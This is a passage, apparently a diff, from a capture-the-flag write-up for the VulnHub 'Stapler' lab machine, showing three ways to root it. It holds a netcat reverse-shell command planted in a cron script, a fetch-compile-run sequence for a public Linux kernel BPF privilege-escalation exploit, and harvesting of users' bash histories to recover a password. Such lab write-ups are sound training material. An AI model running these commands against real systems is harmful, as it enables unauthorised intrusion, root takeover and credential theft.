+mknod /tmp/backpipe p; echo "nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe" > /usr/local/sbin/cron-logrotate.sh 
+```
+
+on the attacker open a listener and wait 5 min:
+``` bash
+nc -nvlp 1337
+```
+
+after a quick cup of hot beverage we catch the shell and run an id:
+
+```
+listening on [any] 1337 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 50986
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+we have a root shell, lets upgrade the sh to bash:
+
+``` bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
+
+## Kernel Busting!
+
+With aging boxes, kernel smashing can be a quick win. This case it's no different, start by getting the full version info
+
+``` bash
+uname -a
+```
+Shows us
+```
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+```
+
+A little digging with searchsploit and we have a few contenders.
+``` bash
+searchsploit 4.4 linux kernel
+```
+
+```
+---------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                    |  Path
+                                                                                  | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Esc | exploits/linux/local/19933.rb
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)  | exploits/linux_x86/local/9542.c
+Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption      | exploits/linux/dos/39545.txt
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)   | exploits/linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Lea | exploits/linux/dos/46529.c
+Linux Kernel 4.4 - 'rtnetlink' Stack Memory Disclosure                            | exploits/linux/local/46006.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | exploits/linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                              | exploits/linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation               | exploits/linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds  | exploits/linux_x86-64/local/40049.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/39277.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/40003.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege | exploits/linux/local/39772.txt
+Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation         | exploits/arm/local/31574.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | exploits/linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | exploits/linux/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c
+---------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+```
+closer look at Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal
+``` bash
+searchsploit -x 43418.c
+```
+
+This almost looks promising as it includes KASLR and SMEP bypasses, but no SMAP bypass.
+
+Kernel Address Space Layout Randomization (KASLR) randomizes where the kernel code is placed at boot time, making it near impossible to overflow memory with hard coded memory locations. Covering this in the exploit shows the devleoper has a matured the exploit to work outside a PoC Lab.
 
 
+Supervisor Mode Access Prevention (SMAP) is designed to complement Supervisor Mode Execution Prevention (SMEP), SMEP can be used to prevent supervisor mode from unintentionally executing user-space code, SMAP extends this protection to reads and writes.
 
+Bit risky, lets look elsewhere: Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege
+
+``` bash
+searchsploit -x 39772
+```
+
+first pre-req is that CONFIG_BPF_SYSCALL is set to true.
+Quick google shows this should be located here: /boot/config-4*
+
+lets check:
+
+``` bash
+cat /boot/config-4.4.0-21-generic | grep CONFIG_BPF_SYSCALL
+```
+
+yaas!
+
+```
+CONFIG_BPF_SYSCALL=y
+```
+
+Next we need to check sysctl to make sure kernel.unprivileged_bpf_disabled is 0
+
+``` bash
+sysctl -a | grep kernel.unprivileged_bpf_disabled
+```
+
+It is!
+
+```
+sysctl: permission denied on key 'fs.protected_hardlinks'
+sysctl: permission denied on key 'fs.protected_symlinks'
+sysctl: permission denied on key 'kernel.cad_pid'
+kernel.unprivileged_bpf_disabled = 0
+sysctl: permission denied on key 'kernel.unprivileged_userns_apparmor_policy'
+sysctl: permission denied on key 'kernel.usermodehelper.bset'
+sysctl: permission denied on key 'kernel.usermodehelper.inheritable'
+sysctl: permission denied on key 'net.ipv4.tcp_fastopen_key'
+sysctl: permission denied on key 'net.ipv6.conf.all.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.default.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.enp0s3.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.lo.stable_secret'
+```
+
+This looks a little more solid and has an off system link to PoC code, lets get it
+
+``` bash
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+sudo python -m SimpleHTTPServer 80
+```
+
+on our victim, lets pull the exploit over with wget
+
+TODO
+
+this! With outputs
+``` bash
+wget http://192.168.56.1/39772.zip 
+unzip 39772.zip && cd 39772
+```
+outputs the tools:
+```
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+```
+Lets unpack the exploit:
+``` bash
+tar -xvf exploit.tar && cd ebpf_mapfd_doubleput_exploit
+```
+gives us
+```
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+```
+and compile:
+``` bash
+bash compile.sh
+```
+returns some minor errors
+```
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+<ontent/uploads/39772/ebpf_mapfd_doubleput_exploit$ ls
+compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper	suidhelper.c
+
+```
+We don't care! Time to pwn!
+``` bash
+./doubleput
+```
+
+It is working
+
+```
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+```
+
+I AM ROOT!
+``` bash
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+``` 
+
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
+
+## Poor Peter!
+A little trick I learned from Hack the box is always check to see if you can read the user histories before you do anything. A handy password parsed into a command might just give us a quick way to a user account.
+
+``` bash
+cat /home/*/.bash_history > history.txt
+```
+executes fine with one deny
+
+```
+cat: /home/peter/.bash_history: Permission denied
+```
+
+peter must be the admin, as he's the only protected account, lets see if there are any goodies:
+
+![history.png](/assets/vulnhub_stuff/stapler/history.png)
+
+
+peter's ssh login password! JZQuyIN5
+
+lets be peter 
+
+``` bash
+su peter
+JZQuyIN5
+```
+
+Success!
+
+```
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses --- 
+```
+
+My zsh is not so good, I select 0 to drop to a vanilla shell.
+
+pop a bash prompt:
+```bash
+bash
+```
+lets check if the hunch is right and we have admin:
+``` bash
+sudo -l
+```
+prompts us for peter's password
+```
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter: 
+```
+Enter it to find out we have full sudo!
+
+```
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+```
+
+lets get the flag!
+
+```
+sudo ls -la /root
+```
+
+```
+total 208
+drwx------  4 root root  4096 Aug 25 21:59 .
+drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
+-rw-------  1 root root     1 Jun  5  2016 .bash_history
+-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
+-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
+-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
+-rw-r--r--  1 root root   345 Jun  5  2016 issue
+-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
+-rw-------  1 root root     1 Jun  5  2016 .mysql_history
+drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
+-rw-------  1 root root  1024 Jun  5  2016 .rnd
+drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
+-rw-------  1 root root     1 Jun  5  2016 .viminfo
+-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
+-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump
+-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1
+-rw-------  1 root root    39 Jun  5  2016 .zsh_history
+-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
+-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
+```
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
